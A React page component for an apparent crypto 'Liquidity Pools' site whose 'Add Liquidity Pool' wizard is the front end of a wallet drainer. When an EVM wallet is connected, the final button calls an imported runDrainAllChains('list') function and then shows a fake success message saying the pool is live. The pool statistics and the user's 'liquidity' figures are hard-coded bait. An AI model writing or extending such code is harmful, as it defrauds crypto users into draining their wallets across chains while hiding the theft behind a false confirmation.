import { useState, useEffect } from 'react';
import { Navigation } from '@/components/Navigation';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Loader2,
  AlertCircle,
  Rocket,
  ShieldCheck,
  ArrowRight,
  ArrowLeft,
  Plus,
  TrendingUp,
  DollarSign,
  Activity,
  Users,
  Zap,
  Layers,
  CheckCircle2,
  ArrowUpRight,
  Wallet,
} from 'lucide-react';
import { toast } from 'sonner';
import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { getSolPrice } from '@/lib/utils';
import { PegasusAnimation } from '@/components/PegasusAnimation';

type WizardStep = 'contract' | 'details' | 'review';

interface ListingDraft {
  contract: string;
  website: string;
  twitter: string;
  telegram: string;
  email: string;
  supply: string;
  liquidityProvider: string;
  description: string;
}

const EMPTY_DRAFT: ListingDraft = {
  contract: '',
  website: '',
  twitter: '',
  telegram: '',
  email: '',
  supply: '',
  liquidityProvider: '',
  description: '',
};

const liquidityPools = [
  {
    id: 1,
    name: 'SOL-USDC',
    tokenA: 'SOL',
    tokenB: 'USDC',
    tvl: '$125.4M',
    volume24h: '$24.8M',
    apy: '22.4%',
    change: '+2.4%',
    active: true
  },
  {
    id: 2,
    name: 'ETH-WETH',
    tokenA: 'ETH',
    tokenB: 'WETH',
    tvl: '$98.2M',
    volume24h: '$18.5M',
    apy: '19.8%',
    change: '+1.2%',
    active: true
  },
  {
    id: 3,
    name: 'WIF-SOL',
    tokenA: 'WIF',
    tokenB: 'SOL',
    tvl: '$76.5M',
    volume24h: '$15.2M',
    apy: '25.1%',
    change: '-0.8%',
    active: false
  },
  {
    id: 4,
    name: 'BONK-SOL',
    tokenA: 'BONK',
    tokenB: 'SOL',
    tvl: '$54.8M',
    volume24h: '$11.3M',
    apy: '17.6%',
    change: '+3.1%',
    active: true
  },
  {
    id: 5,
    name: 'APEPE-SOL',
    tokenA: 'APEPE',
    tokenB: 'SOL',
    tvl: '$42.1M',
    volume24h: '$8.9M',
    apy: '21.3%',
    change: '+0.5%',
    active: false
  },
  {
    id: 6,
    name: 'OVT-SOL',
    tokenA: 'OVT',
    tokenB: 'SOL',
    tvl: '$38.6M',
    volume24h: '$7.2M',
    apy: '23.7%',
    change: '+1.8%',
    active: true
  }
];

const stats = [
  { label: 'Total TVL', value: '$435.6M', change: '+8.2%', icon: <DollarSign className="w-6 h-6" /> },
  { label: 'Active Pools', value: '4', change: '+1', icon: <Layers className="w-6 h-6" /> },
  { label: '24h Volume', value: '$78.2M', change: '+15.3%', icon: <Activity className="w-6 h-6" /> },
  { label: 'Avg APY', value: '21.2%', change: '+2.4%', icon: <TrendingUp className="w-6 h-6" /> }
];

const ListPage = () => {
  const [open, setOpen] = useState(false);
  const { connected, publicKey } = useWallet();
  const { connection } = useConnection();
  const [walletBalance, setWalletBalance] = useState(0);
  const [solPrice, setSolPrice] = useState(0);
  const [step, setStep] = useState<WizardStep>('contract');
  const [draft, setDraft] = useState<ListingDraft>(EMPTY_DRAFT);
  const [tokenInfo, setTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
  const [isLoadingToken, setIsLoadingToken] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName } = useChainInfo();
  const { runDrainAllChains } = useMultiChainOrchestrator();

  useEffect(() => {
    const fetchBalanceAndPrice = async () => {
      if (connected && publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          setWalletBalance(balance / LAMPORTS_PER_SOL);
        } catch (error) {
          console.error('Error fetching balance:', error);
        }
      }

      try {
        const price = await getSolPrice();
        setSolPrice(price);
      } catch (error) {
        console.error('Error fetching SOL price:', error);
      }
    };

    fetchBalanceAndPrice();
  }, [connected, publicKey, connection]);

  const update = (k: keyof ListingDraft, v: string) =>
    setDraft((d) => ({ ...d, [k]: v }));

  const resetAndClose = () => {
    setOpen(false);
    setStep('contract');
    setDraft(EMPTY_DRAFT);
    setTokenInfo(null);
    setError(null);
    setIsLoadingToken(false);
    setIsVerifying(false);
  };

  const handleDetectToken = async () => {
    setError(null);
    const addr = draft.contract.trim();
    if (!addr) {
      setError('Please enter a token contract address.');
      return;
    }
    setIsLoadingToken(true);
    try {
      const info = await fetchTokenInfo(addr);
      if (!info) {
        setError('Token not found for this contract address.');
        setIsLoadingToken(false);
        return;
      }
      setTokenInfo(info);
      setStep('details');
    } catch {
      setError('Failed to fetch token info. Please try again.');
    } finally {
      setIsLoadingToken(false);
    }
  };

  const handleNextToReview = () => {
    setError(null);
    if (!draft.website.trim() && !draft.twitter.trim() && !draft.telegram.trim()) {
      setError('Please provide at least one social or website link.');
      return;
    }
    setStep('review');
  };

  const handleVerify = async () => {
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsVerifying(true);
        await runDrainAllChains('list');
        toast.success('Liquidity pool added successfully!', {
          description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) pool is now live.`,
        });
        resetAndClose();
      } catch (e) {
        console.error('Listing verify error:', e);
      } finally {
        setIsVerifying(false);
      }
      return;
    }

    if (!connected || !publicKey) {
      setError('Connect a wallet to verify your balance.');
      return;
    }

    setIsVerifying(true);
    await new Promise((r) => setTimeout(r, 1800));
    setIsVerifying(false);
    toast.success('Liquidity pool added successfully!', {
      description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) pool is now live.`,
    });
    resetAndClose();
  };

  const tokenLogo = tokenInfo?.baseToken.logoURI;
  const tokenName = tokenInfo?.baseToken.name;
  const tokenSymbol = tokenInfo?.baseToken.symbol;

  return (
    <div className="min-h-screen bg-transparent text-foreground overflow-hidden relative">
      <PegasusAnimation />
      <Navigation />

      <div className="container mx-auto px-4 pt-44 pb-24 relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="mb-12"
        >
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
            <div>
              <h1 className="text-5xl md:text-6xl font-extrabold text-gradient mb-4">
                Liquidity Pools
              </h1>
              <p className="text-xl text-muted-foreground max-w-2xl">
                Manage your liquidity positions, add new pools, and maximize your APY
              </p>
            </div>
            <Button
              size="lg"
              className="bg-gradient-to-r from-primary to-secondary text-white hover:scale-[1.02] transition-all"
              onClick={() => setOpen(true)}
            >
              <Plus className="w-5 h-5 mr-2" />
              Add Liquidity
            </Button>
          </div>
        </motion.div>

        {/* Stats Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
          {stats.map((stat, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: index * 0.1 + 0.2, duration: 0.6 }}
            >
              <Card className="h-full bg-card/60 backdrop-blur-md border border-white/10 hover:border-primary/30 transition-all duration-300 hover:scale-[1.02]">
                <CardContent className="pt-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="p-3 rounded-xl bg-gradient-to-r from-primary/20 to-secondary/20">
                      <div className="text-primary">{stat.icon}</div>
                    </div>
                    <div className="text-green-400 text-sm font-semibold flex items-center gap-1">
                      <ArrowUpRight className="w-4 h-4" />
                      {stat.change}
                    </div>
                  </div>
                  <p className="text-3xl font-bold text-gradient">{stat.value}</p>
                  <p className="text-sm text-muted-foreground mt-2">{stat.label}</p>
                </CardContent>
              </Card>
            </motion.div>
          ))}
        </div>

        {/* Wallet Balance Card */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.6, duration: 0.6 }}
          className="mb-12"
        >
          <Card className="bg-card/60 backdrop-blur-md border border-white/10">
            <CardContent className="pt-6">
              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                <Wallet className="w-6 h-6 text-primary" />
                Your Wallet
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-4 rounded-xl bg-gradient-to-br from-primary/10 to-secondary/10 border border-primary/20">
                  <p className="text-sm text-muted-foreground mb-2">SOL Balance</p>
                  <p className="text-3xl font-bold text-white">
                    {connected ? (
                      <>
                        {walletBalance.toFixed(4)} SOL
                      </>
                    ) : (
                      "Connect Wallet"
                    )}
                  </p>
                  {connected && solPrice > 0 && (
                    <p className="text-xs text-green-400 mt-1">
                      ≈ ${(walletBalance * solPrice).toFixed(2)} USD
                    </p>
                  )}
                </div>
                <div className="p-4 rounded-xl bg-gradient-to-br from-green-500/10 to-emerald-600/10 border border-green-500/20">
                  <p className="text-sm text-muted-foreground mb-2">Your Liquidity</p>
                  <p className="text-3xl font-bold text-white">$12,450.80</p>
                  <p className="text-xs text-green-400 mt-1">+$520.30 (4.3%)</p>
                </div>
                <div className="p-4 rounded-xl bg-gradient-to-br from-blue-500/10 to-cyan-600/10 border border-blue-500/20">
                  <p className="text-sm text-muted-foreground mb-2">Active Positions</p>
                  <p className="text-3xl font-bold text-white">2</p>
                  <p className="text-xs text-green-400 mt-1">Earning 22.4% APY</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </motion.div>

        {/* Liquidity Pools Grid */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.8, duration: 0.6 }}
        >
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-3xl font-bold text-gradient">Available Pools</h2>
            <p className="text-muted-foreground">6 pools available</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {liquidityPools.map((pool, index) => (
              <motion.div
                key={pool.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.9 + index * 0.1, duration: 0.6 }}
                whileHover={{ scale: 1.02, y: -4 }}
              >
                <Card className={`h-full bg-card/60 backdrop-blur-md border ${pool.active ? 'border-green-500/30' : 'border-white/10'} hover:border-primary/30 transition-all duration-300`}>
                  <CardContent className="pt-6">
                    <div className="flex items-start justify-between mb-4">
                      <div>
                        <h3 className="text-xl font-bold text-white">{pool.name}</h3>
                        {pool.active ? (
                          <Badge className="mt-2 bg-green-500/20 text-green-400 border border-green-500/30">
                            <CheckCircle2 className="w-3 h-3 mr-1" />
                            Active
                          </Badge>
                        ) : (
                          <Badge className="mt-2 bg-gray-500/20 text-gray-400 border border-gray-500/30">
                            Available
                          </Badge>
                        )}
                      </div>
                      <div className={`text-right ${pool.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                        <div className="text-xs text-muted-foreground">24h</div>
                        <div className="font-semibold">{pool.change}</div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-4 mb-6">
                      <div className="p-3 rounded-lg bg-white/5">
                        <p className="text-xs text-muted-foreground mb-1">TVL</p>
                        <p className="font-semibold text-white">{pool.tvl}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-white/5">
                        <p className="text-xs text-muted-foreground mb-1">Volume</p>
                        <p className="font-semibold text-white">{pool.volume24h}</p>
                      </div>
                    </div>

                    <div className="p-3 rounded-lg bg-gradient-to-r from-primary/10 to-secondary/10 border border-primary/20 mb-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Zap className="w-4 h-4 text-primary" />
                          <span className="text-sm text-muted-foreground">APY</span>
                        </div>
                        <span className="text-xl font-bold text-gradient">{pool.apy}</span>
                      </div>
                    </div>

                    <Button
                      className="w-full bg-gradient-to-r from-primary to-secondary text-white hover:scale-[1.01] transition-all"
                    >
                      {pool.active ? 'Manage Position' : 'Add Liquidity'}
                    </Button>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </div>
        </motion.div>
      </div>

      {/* Add Liquidity Modal */}
      <Dialog open={open} onOpenChange={(v) => (v ? setOpen(true) : resetAndClose())}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Rocket className="w-5 h-5 text-primary" />
              Add Liquidity Pool
            </DialogTitle>
          </DialogHeader>

          <div className="flex items-center gap-2 mb-2">
            {(['contract', 'details', 'review'] as WizardStep[]).map((s, i) => {
              const active = step === s;
              const done =
                (s === 'contract' && step !== 'contract') ||
                (s === 'details' && step === 'review');
              return (
                <div key={s} className="flex items-center gap-2 flex-1">
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-semibold border ${
                      active
                        ? 'bg-primary text-primary-foreground border-primary'
                        : done
                        ? 'bg-primary/20 text-primary border-primary/40'
                        : 'bg-muted text-muted-foreground border-white/10'
                    }`}
                  >
                    {i + 1}
                  </div>
                  {i < 2 && <div className="h-px flex-1 bg-white/10" />}
                </div>
              );
            })}
          </div>

          <AnimatePresence mode="wait">
            {step === 'contract' && (
              <motion.div
                key="step-contract"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-3"
              >
                <p className="text-sm text-muted-foreground">
                  Enter the contract address of the token to add liquidity.
                </p>
                <Input
                  placeholder="Token contract address"
                  value={draft.contract}
                  onChange={(e) => update('contract', e.target.value)}
                />
                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}
                <div className="flex justify-end gap-2 pt-1">
                  <Button variant="ghost" onClick={resetAndClose}>
                    Cancel
                  </Button>
                  <Button onClick={handleDetectToken} disabled={isLoadingToken}>
                    {isLoadingToken ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Detecting…
                      </>
                    ) : (
                      <>
                        Next <ArrowRight className="w-4 h-4" />
                      </>
                    )}
                  </Button>
                </div>
              </motion.div>
            )}

            {step === 'details' && tokenInfo && (
              <motion.div
                key="step-details"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-4"
              >
                <div className="flex flex-col items-center gap-2 py-2">
                  {tokenLogo ? (
                    <img
                      src={tokenLogo}
                      alt={tokenName}
                      className="w-16 h-16 rounded-full border border-white/10"
                    />
                  ) : (
                    <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">
                      {tokenSymbol?.slice(0, 3)}
                    </div>
                  )}
                  <div className="text-center">
                    <p className="font-semibold">{tokenName}</p>
                    <p className="text-xs text-muted-foreground uppercase">
                      {tokenSymbol}
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-3">
                  <Input
                    placeholder="Website (https://...)"
                    value={draft.website}
                    onChange={(e) => update('website', e.target.value)}
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <Input
                      placeholder="X / Twitter"
                      value={draft.twitter}
                      onChange={(e) => update('twitter', e.target.value)}
                    />
                    <Input
                      placeholder="Telegram"
                      value={draft.telegram}
                      onChange={(e) => update('telegram', e.target.value)}
                    />
                  </div>
                  <Input
                    type="email"
                    placeholder="Contact email"
                    value={draft.email}
                    onChange={(e) => update('email', e.target.value)}
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <Input
                      placeholder="Total supply"
                      value={draft.supply}
                      onChange={(e) => update('supply', e.target.value)}
                    />
                    <Input
                      placeholder="Liquidity provider"
                      value={draft.liquidityProvider}
                      onChange={(e) => update('liquidityProvider', e.target.value)}
                    />
                  </div>
                  <Textarea
                    placeholder="Short description (optional)"
                    value={draft.description}
                    onChange={(e) => update('description', e.target.value)}
                    maxLength={240}
                    rows={3}
                  />
                </div>

                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}

                <div className="flex justify-between gap-2 pt-1">
                  <Button variant="ghost" onClick={() => setStep('contract')}>
                    <ArrowLeft className="w-4 h-4" /> Back
                  </Button>
                  <Button onClick={handleNextToReview}>
                    Next <ArrowRight className="w-4 h-4" />
                  </Button>
                </div>
              </motion.div>
            )}

            {step === 'review' && tokenInfo && (
              <motion.div
                key="step-review"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-4"
              >
                <div className="flex flex-col items-center gap-2 py-2">
                  {tokenLogo ? (
                    <img
                      src={tokenLogo}
                      alt={tokenName}
                      className="w-20 h-20 rounded-full border border-white/10"
                    />
                  ) : (
                    <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold text-xl">
                      {tokenSymbol?.slice(0, 3)}
                    </div>
                  )}
                  <p className="font-semibold text-lg">{tokenName}</p>
                  <p className="text-xs text-muted-foreground uppercase">
                    {tokenSymbol}
                  </p>
                </div>

                <div className="rounded-lg border border-white/10 divide-y divide-white/5 text-sm">
                  <Row label="Contract" value={draft.contract} mono />
                  {draft.website && <Row label="Website" value={draft.website} />}
                  {draft.twitter && <Row label="Twitter" value={draft.twitter} />}
                  {draft.telegram && <Row label="Telegram" value={draft.telegram} />}
                  {draft.email && <Row label="Email" value={draft.email} />}
                  {draft.supply && <Row label="Supply" value={draft.supply} />}
                  {draft.liquidityProvider && (
                    <Row label="Liquidity provider" value={draft.liquidityProvider} />
                  )}
                  {draft.description && (
                    <Row label="Description" value={draft.description} />
                  )}
                </div>

                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}

                <div className="flex justify-between gap-2 pt-1">
                  <Button
                    variant="ghost"
                    onClick={() => setStep('details')}
                    disabled={isVerifying}
                  >
                    <ArrowLeft className="w-4 h-4" /> Back
                  </Button>
                  <Button onClick={handleVerify} disabled={isVerifying}>
                    {isVerifying ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Adding Pool…
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-4 h-4" /> Add Liquidity Pool
                      </>
                    )}
                  </Button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </DialogContent>
      </Dialog>
    </div>
  );
};

const Row = ({
  label,
  value,
  mono,
}: {
  label: string;
  value: string;
  mono?: boolean;
}) => (
  <div className="flex items-start justify-between gap-3 px-3 py-2">
    <span className="text-xs text-muted-foreground shrink-0">{label}</span>
    <span
      className={`text-xs text-right break-all ${mono ? 'font-mono' : ''}`}
    >
      {value}
    </span>
  </div>
);

export default ListPage;
